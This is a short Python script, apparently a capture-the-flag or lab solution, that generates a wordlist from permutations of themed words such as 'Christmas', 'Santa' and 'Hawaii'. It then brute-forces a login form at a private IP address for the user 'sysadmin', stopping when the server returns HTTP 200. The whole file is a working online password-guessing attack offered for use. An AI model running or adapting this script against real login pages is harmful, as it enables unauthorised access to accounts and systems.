import requests
import itertools
url= "http://172.17.3.138/login"

guess= ["Christmas","Xmas","Gifts","Santa","Jul","LisQ","2022","October","23","Moderator","Dont","Hawaii"]

for c in itertools.permutations(guess,5):
    f=open("passwords.txt","a")
    f.write(''.join(c)+"\n")

with open('passwords.txt','r')as f:

    lines=f.readlines()
    for line in lines:
        #   txt=str(i)
        #  txt= txt.zfill(4)
        data= {'username':'sysadmin','password':line.strip()}
        print(data)
        response= requests.post(url,data=data)
        if (response.status_code==200):
            print(data)
            break
print(response)      

